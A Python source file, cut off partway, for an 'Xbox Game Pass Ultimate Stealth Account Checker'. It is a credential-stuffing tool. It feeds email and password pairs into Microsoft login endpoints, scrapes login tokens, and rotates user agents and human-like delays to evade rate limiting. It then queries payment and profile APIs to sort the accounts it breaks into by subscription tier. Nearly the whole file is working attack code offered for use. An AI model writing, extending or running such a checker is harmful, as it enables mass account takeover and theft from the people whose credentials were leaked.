"""
Xbox Game Pass Ultimate Stealth Account Checker
Version: 3.0.0 - Anti-Rate-Limit Edition
Advanced stealth techniques to avoid rate limiting without proxies
"""

import requests
import time
import os
import urllib.parse
import uuid
import threading
import concurrent.futures
import re
import json
import logging
import random
import hashlib
import base64
from datetime import datetime, timedelta
from collections import deque, defaultdict

# Professional logging setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] XboxStealth: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger('XboxStealth')

class StealthAPI:
    """Ultra-stealth API handler focused on specific Microsoft authentication endpoints"""
    
    # Core API endpoints from your specification
    LIVE_POST_ENDPOINT = "https://login.live.com/ppsecure/post.srf"
    LIVE_OAUTH_ENDPOINT = "https://login.live.com/oauth20_authorize.srf"
    PAYMENT_INSTRUMENTS_ENDPOINT = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx"
    PAYMENT_TRANSACTIONS_ENDPOINT = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
    BING_REWARDS_ENDPOINT = "https://rewards.bing.com/"
    RECAPTCHA_ENDPOINT = "https://www.google.com/recaptcha/enterprise/anchor"
    
    # Additional Microsoft Account APIs - User Research
    MS_ACCOUNT_COMPLETE_SIGNIN = "https://account.microsoft.com/auth/complete-signin"
    MS_ACCOUNT_DASHBOARD = "https://account.microsoft.com/"
    
    # API Configuration
    CLIENT_IDS = {
        'outlook': "0000000048170EF2",
        'account': "000000000004773A"
    }
    
    REDIRECT_URIS = {
        'outlook': "https://login.live.com/oauth20_desktop.srf",
        'account': "https://account.microsoft.com/auth/complete-silent-delegate-auth"
    }
    
    SCOPES = {
        'outlook': "service::outlook.office.com::MBI_SSL",
        'account': "PIFD.Read PIFD.Create PIFD.Update PIFD.Delete"
    }
    
    def __init__(self):
        self.session = requests.Session()
        self.last_request_time = 0
        self.request_count = 0
        self.session_start = time.time()
        self.update_session_headers()
    
    def update_session_headers(self):
        """Update session with realistic Xbox/Microsoft headers"""
        self.session.headers.update({
            'User-Agent': self._get_stealth_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        })
    
    def _get_stealth_user_agent(self):
        """Generate ultra-realistic user agents with proper version sequences"""
        chrome_versions = [
            "120.0.6099.109", "120.0.6099.71", "119.0.6045.199", "119.0.6045.159",
            "118.0.5993.117", "118.0.5993.88", "117.0.5938.149", "117.0.5938.132"
        ]
        
        windows_versions = [
            "Windows NT 10.0; Win64; x64",
            "Windows NT 10.0; WOW64",
            "Windows NT 6.1; Win64; x64"
        ]
        
        chrome_ver = random.choice(chrome_versions)
        windows_ver = random.choice(windows_versions)
        
        return f"Mozilla/5.0 ({windows_ver}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Safari/537.36"
    
    def smart_delay(self):
        """Ultra-smart delay system that mimics human behavior"""
        current_time = time.time()
        
        # Calculate time since last request
        time_since_last = current_time - self.last_request_time
        
        # Base delay that increases with request count
        base_delay = 3.0 + (self.request_count * 0.1)
        
        # Add randomness to make it more human-like
        human_variance = random.uniform(0.8, 2.2)
        
        # Progressive slowdown after many requests
        if self.request_count > 50:
            base_delay += 2.0
        if self.request_count > 100:
            base_delay += 3.0
        
        # Calculate final delay
        final_delay = base_delay * human_variance
        
        # Ensure minimum delay
        min_delay = max(3.0, final_delay)
        
        # If we made a request too recently, wait longer
        if time_since_last < min_delay:
            additional_wait = min_delay - time_since_last
            logger.debug(f"⏰ Smart delay: {additional_wait:.2f}s (human-like timing)")
            time.sleep(additional_wait)
        
        self.last_request_time = time.time()
        self.request_count += 1
        
        # Refresh session headers periodically
        if self.request_count % 25 == 0:
            self.update_session_headers()
            logger.debug("🔄 Session headers refreshed for maximum stealth")
    
    def authenticate_account(self, email, password):
        """Authenticate account using the specified API endpoints"""
        
        # Define authentication methods in order of preference (using your specified APIs)
        auth_methods = [
            ('live_outlook', self._try_live_outlook_api),
            ('live_oauth_silent', self._try_live_oauth_silent),
            ('payment_instruments', self._try_payment_instruments_direct),
            ('bing_rewards', self._try_bing_rewards_auth),
            ('ms_account_complete', self._try_ms_account_complete_signin),
            ('ms_account_dashboard', self._try_ms_account_dashboard)
        ]
        
        last_error = None
        
        for method_name, method_func in auth_methods:
            try:
                logger.debug(f"🔄 Trying {method_name} for {email}")
                result = method_func(email, password)
                
                if result['status'] in ['success', 'ultimate', 'core', 'pc_console', 'free']:
                    logger.info(f"✅ {method_name} successful for {email}")
                    if result['status'] == 'success':
                        return self._check_subscriptions_via_payment_api(email)
                    else:
                        return result
                elif result['status'] == 'invalid':
                    # If credentials are invalid, no point trying other methods
                    return result
                elif result['status'] == 'rate_limited':
                    # If rate limited, wait and try next method
                    logger.warning(f"⚠️ Rate limited on {method_name} for {email}")
                    time.sleep(random.uniform(5, 10))
                    last_error = result
                    continue
                else:
                    # Method failed, try next one
                    logger.debug(f"❌ {method_name} failed for {email}: {result.get('message', 'Unknown error')}")
                    last_error = result
                    continue
                    
            except Exception as e:
                logger.debug(f"❌ {method_name} exception for {email}: {e}")
                last_error = {'status': 'error', 'message': str(e)}
                continue
        
        # If all methods failed, return the last error
        return last_error or {'status': 'error', 'message': 'All authentication methods failed'}
    
    def _try_live_outlook_api(self, email, password):
        """Authentication using Live.com Outlook API endpoint"""
        try:
            self.smart_delay()
            
            # Generate contextid and other required parameters
            import hashlib
            contextid = hashlib.md5(email.encode()).hexdigest().upper()
            bk = str(int(time.time()))
            uaid = str(uuid.uuid4()).replace('-', '')
            
            # Build the exact URL structure from your API
            auth_params = {
                'client_id': self.CLIENT_IDS['outlook'],
                'redirect_uri': self.REDIRECT_URIS['outlook'],
                'response_type': 'token',
                'scope': self.SCOPES['outlook'],
                'display': 'touch',
                'username': email,
                'contextid': contextid,
                'bk': bk,
                'uaid': uaid,
                'pid': '15216'
            }
            
            # First get the authentication page
            auth_response = self.session.get(self.LIVE_POST_ENDPOINT, params=auth_params)
            
            if self._detect_rate_limiting(auth_response):
                return {'status': 'rate_limited', 'message': 'Rate limited on Live Outlook API'}
            
            if auth_response.status_code != 200:
                return {'status': 'error', 'message': 'Failed to access Live Outlook API'}
            
            # Try to extract form data and submit credentials
            return self._submit_live_credentials(auth_response, email, password, 'live_outlook')
            
        except Exception as e:
            return {'status': 'error', 'message': f'Live Outlook API error: {str(e)}'}
    
    def _try_live_oauth_silent(self, email, password):
        """Silent OAuth authentication using Live.com OAuth endpoint"""
        try:
            self.smart_delay()
            
            # Use the exact OAuth endpoint from your specification
            oauth_params = {
                'client_id': self.CLIENT_IDS['account'],
                'response_type': 'token',
                'scope': self.SCOPES['account'],
                'redirect_uri': self.REDIRECT_URIS['account'],
                'state': json.dumps({
                    "userId": hashlib.md5(email.encode()).hexdigest()[:16],
                    "scopeSet": "pidl"
                }),
                'prompt': 'none'
            }
            
            oauth_response = self.session.get(self.LIVE_OAUTH_ENDPOINT, params=oauth_params)
            
            if self._detect_rate_limiting(oauth_response):
                return {'status': 'rate_limited', 'message': 'Rate limited on Live OAuth'}
            
            # Check for access token in response or redirect
            if 'access_token' in oauth_response.url or oauth_response.status_code == 200:
                return self._verify_via_payment_instruments(email)
            
            return {'status': 'error', 'message': 'Silent OAuth failed'}
            
        except Exception as e:
            return {'status': 'error', 'message': f'Live OAuth error: {str(e)}'}
    
    def _try_payment_instruments_direct(self, email, password):
        """Direct authentication via payment instruments API"""
        try:
            self.smart_delay()
            
            # Try to access payment instruments directly
            payment_params = {
                'status': 'active,removed',
                'language': 'en-US'
            }
            
            headers = {
                'Accept': 'application/json',
                'Referer': 'https://account.microsoft.com/',
                'X-Requested-With': 'XMLHttpRequest',
                'User-Agent': self._get_stealth_user_agent()
            }
            
            payment_response = self.session.get(
                self.PAYMENT_INSTRUMENTS_ENDPOINT,
                params=payment_params,
                headers=headers
            )
            
            if payment_response.status_code == 200:
                try:
                    payment_data = payment_response.json()
                    return self._analyze_payment_subscription_data(payment_data, email)
                except json.JSONDecodeError:
                    return {'status': 'success', 'message': 'Payment API accessible'}
            elif payment_response.status_code == 401:
                return {'status': 'invalid', 'message': 'Invalid credentials'}
            else:
                return {'status': 'error', 'message': 'Payment API access failed'}
                
        except Exception as e:
            return {'status': 'error', 'message': f'Payment API error: {str(e)}'}
    
    def _try_bing_rewards_auth(self, email, password):
        """Authentication via Bing Rewards endpoint"""
        try:
            self.smart_delay()
            
            # Access Bing Rewards to check for Microsoft ecosystem engagement
            bing_response = self.session.get(self.BING_REWARDS_ENDPOINT)
            
            if bing_response.status_code == 200:
                response_text = bing_response.text.lower()
                
                # Look for authentication indicators
                if any(indicator in response_text for indicator in [
                    'sign in', 'login', 'account', 'microsoft'
                ]):
                    # Try to follow authentication flow
                    return self._process_bing_auth_response(bing_response, email, password)
                else:
                    return {
                        'status': 'free',
                        'subscription': 'Bing accessible',
                        'message': 'Bing Rewards accessible, checking subscriptions'
                    }
            
            return {'status': 'error', 'message': 'Could not access Bing Rewards'}
            
        except Exception as e:
            return {'status': 'error', 'message': f'Bing Rewards error: {str(e)}'}
    
    def _try_ms_account_complete_signin(self, email, password):
        """Authentication via Microsoft Account complete-signin endpoint"""
        try:
            self.smart_delay()
            
            # Build the complete-signin URL with proper parameters
            signin_params = {
                'ru': 'https://account.microsoft.com/?ref=MeControl&refd=www.xbox.com',
                'wa': 'wsignin1.0'
            }
            
            complete_signin_response = self.session.get(
                self.MS_ACCOUNT_COMPLETE_SIGNIN,
                params=signin_params
            )
            
            if self._detect_rate_limiting(complete_signin_response):
                return {'status': 'rate_limited', 'message': 'Rate limited on MS Account complete-signin'}
            
            if complete_signin_response.status_code == 200:
                # Try to submit credentials through this endpoint
                return self._submit_live_credentials(complete_signin_response, email, password, 'ms_complete_signin')
            elif complete_signin_response.status_code == 302:
                # Handle redirect - might already be authenticated or need login
                redirect_url = complete_signin_response.headers.get('Location', '')
                if 'account.microsoft.com' in redirect_url:
                    # Follow redirect and check account access
                    dashboard_response = self.session.get(redirect_url)
                    return self._analyze_ms_account_access(dashboard_response, email)
                else:
                    # Redirect to login - extract and submit credentials
                    login_response = self.session.get(redirect_url)
                    return self._submit_live_credentials(login_response, email, password, 'ms_complete_signin_redirect')
            else:
                return {'status': 'error', 'message': f'MS Account complete-signin failed: {complete_signin_response.status_code}'}
                
        except Exception as e:
            return {'status': 'error', 'message': f'MS Account complete-signin error: {str(e)}'}
    
    def _try_ms_account_dashboard(self, email, password):
        """Direct authentication via Microsoft Account dashboard"""
        try:
            self.smart_delay()
            
            # Try to access Microsoft Account dashboard directly
            dashboard_params = {
                'ref': 'MeControl',
                'refd': 'www.xbox.com'
            }
            
            dashboard_response = self.session.get(
                self.MS_ACCOUNT_DASHBOARD,
                params=dashboard_params
            )
            
            if self._detect_rate_limiting(dashboard_response):
                return {'status': 'rate_limited', 'message': 'Rate limited on MS Account dashboard'}
            
            if dashboard_response.status_code == 200:
                response_text = dashboard_response.text.lower()
                response_url = dashboard_response.url.lower()
                
                # Check if we're already authenticated (redirect to dashboard)
                if 'account.microsoft.com' in response_url and any(indicator in response_text for indicator in [
                    'dashboard', 'account overview', 'profile', 'subscriptions', 'billing'
                ]):
                    return self._analyze_ms_account_access(dashboard_response, email)
                
                # Check if we need to authenticate
                elif any(auth_indicator in response_text for auth_indicator in [
                    'sign in', 'login', 'enter password', 'email or phone'
                ]):
                    return self._submit_live_credentials(dashboard_response, email, password, 'ms_dashboard_auth')
                
                else:
                    return {'status': 'error', 'message': 'MS Account dashboard unclear response'}
            
            elif dashboard_response.status_code == 302:
                # Handle redirect - likely to login
                redirect_url = dashboard_response.headers.get('Location', '')
                if redirect_url:
                    login_response = self.session.get(redirect_url)
                    return self._submit_live_credentials(login_response, email, password, 'ms_dashboard_redirect')
                else:
                    return {'status': 'error', 'message': 'MS Account dashboard redirect failed'}
            
            else:
                return {'status': 'error', 'message': f'MS Account dashboard failed: {dashboard_response.status_code}'}
                
        except Exception as e:
            return {'status': 'error', 'message': f'MS Account dashboard error: {str(e)}'}
    
    def _analyze_ms_account_access(self, response, email):
        """Analyze Microsoft Account access for subscription information"""
        try:
            response_text = response.text.lower()
            
            # Look for Game Pass/Xbox subscription indicators
            if any(ultimate in response_text for ultimate in [
                'xbox game pass ultimate', 'game pass ultimate', 'ultimate subscription'
            ]):
                return {
                    'status': 'ultimate',
                    'subscription': 'Xbox Game Pass Ultimate',
                    'message': 'Ultimate subscription detected in MS Account'
                }
            
            elif any(gamepass in response_text for gamepass in [
                'xbox game pass', 'game pass core', 'game pass pc', 'game pass console'
            ]):
                return {
                    'status': 'core',
                    'subscription': 'Xbox Game Pass Core/PC',
                    'message': 'Game Pass subscription detected in MS Account'
                }
            
            elif any(xbox in response_text for xbox in [
                'xbox live', 'xbox subscription', 'xbox account'
            ]):
                return {
                    'status': 'success',
                    'subscription': 'Xbox Services',
                    'message': 'Xbox services detected in MS Account'
                }
            
            # Check for any Microsoft subscriptions
            elif any(subscription in response_text for subscription in [
                'subscription', 'billing', 'payment method', 'active service'
            ]):
                # Try to get more details via payment API
                return self._check_subscriptions_via_payment_api(email)
            
            else:
                return {
                    'status': 'free',
                    'subscription': 'Microsoft Account',
                    'message': 'Valid MS Account, no visible subscriptions'
                }
                
        except Exception as e:
            return {
                'status': 'free',
                'subscription': 'Microsoft Account',
                'message': f'MS Account accessible, analysis failed: {str(e)}'
            }
    
    def _verify_via_payment_instruments(self, email):
        """Verify account via payment instruments API"""
        try:
            payment_response = self.session.get(
                self.PAYMENT_INSTRUMENTS_ENDPOINT,
                params={'status': 'active,removed', 'language': 'en-US'}
            )
            
            if payment_response.status_code == 200:
                try:
                    payment_data = payment_response.json()
                    return self._analyze_payment_subscription_data(payment_data, email)
                except json.JSONDecodeError:
                    return {'status': 'success', 'message': 'Account verified via payment API'}
            elif payment_response.status_code == 401:
                return {'status': 'invalid', 'message': 'Invalid credentials'}
            else:
                return {'status': 'error', 'message': 'Payment verification failed'}
                
        except Exception as e:
            return {'status': 'error', 'message': f'Payment verification error: {str(e)}'}
    
    def _process_bing_auth_response(self, bing_response, email, password):
        """Process Bing authentication response"""
        try:
            content = bing_response.text
            
            # Look for Microsoft sign-in redirect
            if 'login.live.com' in content or 'login.microsoftonline.com' in content:
                # Extract redirect URL and follow authentication
                auth_urls = re.findall(r'https://login\.(?:live|microsoftonline)\.com[^"\']*', content)
                if auth_urls:
                    auth_response = self.session.get(auth_urls[0])
                    return self._submit_live_credentials(auth_response, email, password, 'bing_auth')
            
            # Check if already authenticated
            if any(indicator in content.lower() for indicator in [
                'dashboard', 'points', 'rewards', 'microsoft account'
            ]):
                return {
                    'status': 'success',
                    'subscription': 'Microsoft Account',
                    'message': 'Bing Rewards accessible'
                }
            
            return {'status': 'free', 'message': 'Bing accessible but no authentication detected'}
            
        except Exception as e:
            return {'status': 'error', 'message': f'Bing auth processing error: {str(e)}'}
    
    def _analyze_payment_subscription_data(self, payment_data, email):
        """Analyze payment data for subscription information"""
        try:
            if not payment_data or not isinstance(payment_data, dict):
                return {'status': 'free', 'message': 'No payment data available'}
            
            # Look for active subscriptions
            subscriptions = []
            
            # Check for Game Pass indicators
            if 'items' in payment_data:
                for item in payment_data.get('items', []):
                    if isinstance(item, dict):
                        name = item.get('name', '').lower()
                        status = item.get('status', '').lower()
                        
                        if status == 'active' and any(keyword in name for keyword in [
                            'game pass', 'gamepass', 'xbox', 'ultimate'
                        ]):
                            if 'ultimate' in name:
                                return {
                                    'status': 'ultimate',
                                    'subscription': 'Xbox Game Pass Ultimate',
                                    'message': f'Active Ultimate subscription found'
                                }
                            elif 'pc' in name or 'console' in name:
                                return {
                                    'status': 'core',
                                    'subscription': 'Xbox Game Pass Core/PC',
                                    'message': f'Active Game Pass subscription found'
                                }
                            else:
                                subscriptions.append(name)
            
            # Check for any Microsoft subscriptions
            if subscriptions:
                return {
                    'status': 'success',
                    'subscription': ', '.join(subscriptions),
                    'message': 'Microsoft subscriptions found'
                }
            
            return {
                'status': 'free',
                'subscription': 'Microsoft Account',
                'message': 'Valid account but no Game Pass subscription'
            }
            
        except Exception as e:
            return {'status': 'error', 'message': f'Payment data analysis error: {str(e)}'}
    
    def _analyze_auth_result(self, response, email, api_type):
        """Analyze authentication response for success/failure indicators"""
        try:
            response_text = response.text.lower()
            response_url = response.url.lower()
            
            # Check for clear authentication failure
            if any(error in response_text for error in [
                'your account or password is incorrect',
                'incorrect password',
                'sign-in name or password',
                'invalid credentials',
                'authentication failed'
            ]):
                return {'status': 'invalid', 'message': 'Invalid credentials'}
            
            # Check for successful authentication indicators
            if any(success in response_url for success in [
                'account.microsoft.com',
                'account.live.com',
                'xbox.com',
                'access_token'
            ]) or any(success in response_text for success in [
                'dashboard', 'account', 'profile', 'subscriptions'
            ]):
                # Try to get subscription details
                return self._check_subscriptions_via_payment_api(email)
            
            # Check for rate limiting or temporary issues
            if response.status_code == 429 or any(rate in response_text for rate in [
                'too many requests', 'rate limit', 'try again later'
            ]):
                return {'status': 'rate_limited', 'message': f'Rate limited on {api_type}'}
            
            # Default to checking subscriptions if response seems positive
            if response.status_code == 200:
                return self._check_subscriptions_via_payment_api(email)
            
            return {'status': 'error', 'message': f'{api_type} authentication unclear'}
            
        except Exception as e:
            return {'status': 'error', 'message': f'Auth result analysis error: {str(e)}'}
    
    def _try_legacy_live_auth(self, email, password):
        """Legacy Live.com authentication as final fallback"""
        return self._try_basic_live_auth(email, password)
    
    def _generate_pkce_challenge(self):
        """Generate PKCE challenge for OAuth2"""
        code_verifier = base64.urlsafe_b64encode(os.urandom(32)).decode('utf-8').rstrip('=')
        code_challenge = base64.urlsafe_b64encode(
            hashlib.sha256(code_verifier.encode('utf-8')).digest()
        ).decode('utf-8').rstrip('=')
        return code_challenge
    
    def _generate_state(self):
        """Generate random state parameter for OAuth2"""
        return str(uuid.uuid4())
    
    def _extract_ppft_token(self, content):
        """Enhanced PPFT token extraction with multiple patterns"""
        # Try multiple PPFT extraction patterns
        ppft_patterns = [
            r'name="PPFT"[^>]*value="([^"]*)"',
            r'"PPFT":"([^"]*)"',
            r'PPFT["\s]*:["\s]*"([^"]*)"',
            r'input[^>]*name="PPFT"[^>]*value="([^"]*)"',
            r'<input[^>]+name="PPFT"[^>]+value="([^"]+)"',
            r'PPFT["\'\s]*=[\s"\']*([^"\'>\s]+)',
            r'flowToken["\s]*:["\s]*"([^"]*)"',
            r'name="flowToken"[^>]*value="([^"]*)"'
        ]
        
        for pattern in ppft_patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match and match.group(1):
                token = match.group(1)
                if len(token) > 10:  # Valid tokens are typically longer
                    logger.debug(f"✅ Extracted PPFT token: {token[:10]}...")
                    return token
        
        logger.debug("❌ No PPFT token found with any pattern")
        return None
    
    def _submit_credentials(self, auth_url, ppft_token, content, email, password, method):
        """Submit credentials with enhanced form data extraction"""
        try:
            self.smart_delay()
            
            # Extract additional form fields
            flow_token = self._extract_field(content, 'flowToken')
            canary = self._extract_field(content, 'canary')
            correlation_id = self._extract_field(content, 'CorrelationId') or str(uuid.uuid4())
            ctx = self._extract_field(content, 'ctx')
            hpg_request_id = self._extract_field(content, 'hpgrequestid')
            
            # Build comprehensive login data
            login_data = {
                'i13': '0',
                'login': email,
                'loginfmt': email,
                'type': '11',
                'LoginOptions': '3',
                'lrt': '',
                'lrtPartition': '',
                'hisRegion': '',
                'hisScaleUnit': '',
                'passwd': password,
                'ps': '2',
                'psRNGCDefaultType': '',
                'psRNGCEntropy': '',
                'psRNGCSLK': '',
                'canary': canary or '',
                'ctx': ctx or '',
                'hpgrequestid': hpg_request_id or '',
                'PPFT': ppft_token,
                'PPSX': 'PassportR',
                'NewUser': '1',
                'FoundMSAs': '',
                'fspost': '0',
                'i21': '0',
                'CookieDisclosure': '0',
                'IsFidoSupported': '1',
                'isSignupPost': '0',
                'isRecoveryAttemptPost': '0',
                'i2': '1',
                'i17': '0',
                'i18': '__DefaultLoginStrings|1,__DefaultLogin_Core|1,',
                'i19': '0',
                'CorrelationId': correlation_id
            }
            
            if flow_token:
                login_data['flowToken'] = flow_token
            
            # Determine post URL
            post_urls = [
                "https://login.microsoftonline.com/common/login",
                "https://login.live.com/ppsecure/post.srf",
                "https://login.microsoftonline.com/kmsi"
            ]
            
            # Try different post endpoints
            for post_url in post_urls:
                try:
                    headers = {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Referer': auth_url,
                        'Origin': 'https://login.microsoftonline.com' if 'microsoftonline' in post_url else 'https://login.live.com',
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                    
                    auth_post_response = self.session.post(
                        post_url,
                        data=login_data,
                        headers=headers,
                        allow_redirects=True,
                        timeout=30
                    )
                    
                    if auth_post_response.status_code == 200:
                        return self._process_auth_response(auth_post_response, email, password, method)
                    
                except Exception as e:
                    logger.debug(f"Failed to post to {post_url}: {e}")
                    continue
            
            return {'status': 'error', 'message': f'Failed to submit credentials via {method}'}
            
        except Exception as e:
            return {'status': 'error', 'message': f'Error submitting credentials: {str(e)}'}
    
    def _extract_field(self, content, field_name):
        """Extract form field value from content"""
        patterns = [
            rf'name="{field_name}"[^>]*value="([^"]*)"',
            rf'"{field_name}":"([^"]*)"',
            rf'{field_name}["\s]*:["\s]*"([^"]*)"',
            rf'<input[^>]+name="{field_name}"[^>]+value="([^"]+)"'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match and match.group(1):
                return match.group(1)
        
        return None
    
    def _detect_rate_limiting(self, response):
        """Enhanced rate limiting detection"""
        if response.status_code == 429:
            return True
        
        if response.status_code in [503, 502, 504]:
            return True
        
        if response.text:
            rate_limit_indicators = [
                'too many requests',
                'rate limit',
                'try again later',
                'service temporarily unavailable',
                'request throttled',
                'aadsts90025',  # Throttling
                'aadsts70019',  # Request limit exceeded
                'aadsts7000023' # Too many requests
            ]
            
            response_text = response.text.lower()
            if any(indicator in response_text for indicator in rate_limit_indicators):
                return True
        
        return False
    
    def _check_microsoft_subscriptions(self, email):
        """Enhanced subscription checking with multiple APIs"""
        try:
            self.smart_delay()
            
            # Try multiple subscription checking methods
            subscription_checkers = [
                self._check_xbox_profile_api,
                self._check_payment_instruments,
                self._check_bing_rewards,
                self._check_xbox_live_auth
            ]
            
            for checker in subscription_checkers:
                try:
                    result = checker(email)
                    if result and result['status'] != 'error':
                        return result
                except Exception as e:
                    logger.debug(f"Subscription checker {checker.__name__} failed: {e}")
                    continue
            
            # Default to free if all checks fail but authentication succeeded
            return {
                'status': 'free',
                'subscription': 'No Game Pass subscription found',
                'message': 'Valid account, no subscription detected'
            }
            
        except Exception as e:
            logger.error(f"Error checking subscriptions for {email}: {e}")
            return {
                'status': 'free',
                'subscription': 'Unknown',
                'message': 'Could not verify subscription status'
            }
    
    def _check_xbox_profile_api(self, email):
        """Check Xbox profile for Game Pass subscription"""
        try:
            self.smart_delay()
            
            # Xbox Profile API
            profile_response = self.session.get('https://profile.xboxlive.com/users/me/profile/settings')
            
            if profile_response.status_code == 200:
                try:
                    profile_data = profile_response.json()
                    
                    # Look for Game Pass indicators in profile
                    profile_settings = profile_data.get('profileUsers', [{}])[0].get('settings', [])
                    
                    for setting in profile_settings:
                        setting_id = setting.get('id', '')
                        value = str(setting.get('value', '')).lower()
                        
                        if 'gamepass' in setting_id.lower() or 'subscription' in setting_id.lower():
                            if 'ultimate' in value:
                                return {
                                    'status': 'ultimate',
                                    'subscription': 'Xbox Game Pass Ultimate',
                                    'message': 'Ultimate subscription found in Xbox profile'
                                }
                            elif 'core' in value or 'gold' in value:
                                return {
                                    'status': 'core',
                                    'subscription': 'Xbox Game Pass Core',
                                    'message': 'Core subscription found in Xbox profile'
                                }
                            elif 'pc' in value or 'console' in value:
                                return {
                                    'status': 'pc_console',
                                    'subscription': 'Xbox Game Pass (PC/Console)',
                                    'message': 'PC/Console subscription found in Xbox profile'
                                }
                    
                    return {
                        'status': 'free',
                        'subscription': 'No Game Pass subscription',
                        'message': 'Valid Xbox profile, no Game Pass found'
                    }
                    
                except json.JSONDecodeError:
                    pass
            
            return {'status': 'error', 'message': 'Could not access Xbox profile'}
            
        except Exception as e:
            return {'status': 'error', 'message': f'Xbox profile API error: {str(e)}'}
    
    def _check_payment_instruments(self, email):
        """Check payment instruments for subscription"""
        try:
            self.smart_delay()
            
            headers = {
                'Accept': 'application/json',
                'Referer': 'https://account.microsoft.com/',
                'X-Requested-With': 'XMLHttpRequest'
            }
            
            payment_response = self.session.get(
                self.PAYMENT_INSTRUMENTS_ENDPOINT,
                headers=headers
            )
            
            if payment_response.status_code == 200:
                try:
                    payment_data = payment_response.json()
                    return self._analyze_payment_data(payment_data, email)
                except json.JSONDecodeError:
                    return {
                        'status': 'free',
                        'subscription': 'No subscription data',
                        'message': 'Payment API accessible but no subscription data'
                    }
            
            return {'status': 'error', 'message': 'Could not access payment instruments'}
            
        except Exception as e:
            return {'status': 'error', 'message': f'Payment instruments error: {str(e)}'}
    
    def _check_bing_rewards(self, email):
        """Check Bing Rewards for Microsoft ecosystem engagement"""
        try:
            self.smart_delay()
            
            bing_response = self.session.get(self.BING_REWARDS_ENDPOINT)
            
            if bing_response.status_code == 200:
                response_text = bing_response.text.lower()
                
                # Look for Game Pass mentions in Bing Rewards
                if any(indicator in response_text for indicator in [
                    'xbox game pass ultimate',
                    'game pass ultimate'
                ]):
                    return {
                        'status': 'ultimate',
                        'subscription': 'Xbox Game Pass Ultimate',
                        'message': 'Ultimate subscription detected via Bing Rewards'
                    }
                elif any(indicator in response_text for indicator in [
                    'xbox game pass',
                    'game pass'
                ]):
                    return {
                        'status': 'pc_console',
                        'subscription': 'Xbox Game Pass',
                        'message': 'Game Pass subscription detected via Bing Rewards'
                    }
                else:
                    return {
                        'status': 'free',
                        'subscription': 'No Game Pass subscription',
                        'message': 'Bing Rewards accessible, no Game Pass found'
                    }
            
            return {'status': 'error', 'message': 'Could not access Bing Rewards'}
            
        except Exception as e:
            return {'status': 'error', 'message': f'Bing Rewards error: {str(e)}'}
    
    def _check_xbox_live_auth(self, email):
        """Final fallback using Xbox Live authentication"""
        try:
            self.smart_delay()
            
            # Try Xbox Live API
            xbox_response = self.session.get('https://user.auth.xboxlive.com/user/authenticate')
            
            if xbox_response.status_code == 200:
                return {
                    'status': 'free',
                    'subscription': 'Xbox Live account verified',
                    'message': 'Valid Xbox account, subscription status unknown'
                }
            
            return {'status': 'error', 'message': 'Could not verify Xbox Live access'}
            
        except Exception as e:
            return {'status': 'error', 'message': f'Xbox Live auth error: {str(e)}'}
    
    def _check_subscriptions_via_payment_api(self, email):
        """Check subscriptions using Payment Instruments API endpoint"""
        try:
            self.smart_delay()
            
            # Use the specific Payment Instruments API from your configuration
            payment_params = {
                'status': 'active,removed',
                'language': 'en-US'
            }
            
            headers = {
                'Accept': 'application/json',
                'Referer': 'https://account.microsoft.com/',
                'X-Requested-With': 'XMLHttpRequest',
                'User-Agent': self._get_stealth_user_agent()
            }
            
            payment_response = self.session.get(
                self.PAYMENT_INSTRUMENTS_ENDPOINT,
                params=payment_params,
                headers=headers
            )
            
            if payment_response.status_code == 200:
                try:
                    payment_data = payment_response.json()
                    return self._analyze_subscription_details(payment_data, email)
                except json.JSONDecodeError:
                    # Even if JSON fails, successful access indicates valid account
                    return {
                        'status': 'success',
                        'subscription': 'Microsoft Account',
                        'message': 'Valid account, payment API accessible'
                    }
            elif payment_response.status_code == 401:
                return {'status': 'invalid', 'message': 'Invalid credentials'}
            elif payment_response.status_code == 403:
                return {'status': 'free', 'message': 'Valid account but no payment access'}
            else:
                logger.debug(f"Payment API returned {payment_response.status_code} for {email}")
                return {'status': 'error', 'message': f'Payment API error: {payment_response.status_code}'}
                
        except Exception as e:
            logger.error(f"Payment API subscription check failed for {email}: {str(e)}")
            return {'status': 'error', 'message': f'Subscription check error: {str(e)}'}
    
    def _analyze_subscription_details(self, payment_data, email):
        """Analyze detailed payment/subscription data"""
        try:
            if not payment_data or not isinstance(payment_data, dict):
                return {
                    'status': 'free',
                    'subscription': 'Microsoft Account',
                    'message': 'Valid account, no subscription data'
                }
            
            active_subscriptions = []
            game_pass_type = None
            
            # Comprehensive subscription analysis
            for key in ['items', 'subscriptions', 'services', 'products']:
                if key in payment_data:
                    items = payment_data[key]
                    if isinstance(items, list):
                        for item in items:
                            if isinstance(item, dict):
                                name = str(item.get('name', '')).lower()
                                display_name = str(item.get('displayName', '')).lower()
                                status = str(item.get('status', '')).lower()
                                product_type = str(item.get('productType', '')).lower()
                                
                                # Combine all text fields for analysis
                                full_text = f"{name} {display_name} {product_type}".lower()
                                
                                if status in ['active', 'enabled', 'current']:
                                    # Check for Game Pass Ultimate
                                    if any(ultimate in full_text for ultimate in [
                                        'game pass ultimate', 'gamepass ultimate', 'gpu', 'xbox ultimate'
                                    ]):
                                        return {
                                            'status': 'ultimate',
                                            'subscription': 'Xbox Game Pass Ultimate',
                                            'message': 'Active Game Pass Ultimate subscription'
                                        }
                                    
                                    # Check for Game Pass Core/PC/Console
